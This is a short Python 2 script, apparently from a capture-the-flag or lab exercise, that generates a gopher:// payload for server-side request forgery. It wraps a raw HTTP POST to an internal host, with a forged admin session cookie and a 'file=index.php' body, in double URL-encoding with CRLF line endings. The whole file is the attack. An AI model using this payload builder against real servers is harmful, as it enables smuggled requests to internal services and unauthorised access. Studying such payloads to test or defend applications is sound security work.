import urllib
import requests
exp='''POST / HTTP/1.1
Host: 172.26.98.147
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: */*;
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Cookie: PHPSESSID=admin
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 95

file=index.php'''
# print exp.split("\n")
tmp = urllib.quote(exp)
tmp = tmp.replace("%0A","%0D%0A")
 
result = "_"+urllib.quote(tmp)

result="gopher://172.26.98.147:40000/"+result
print result
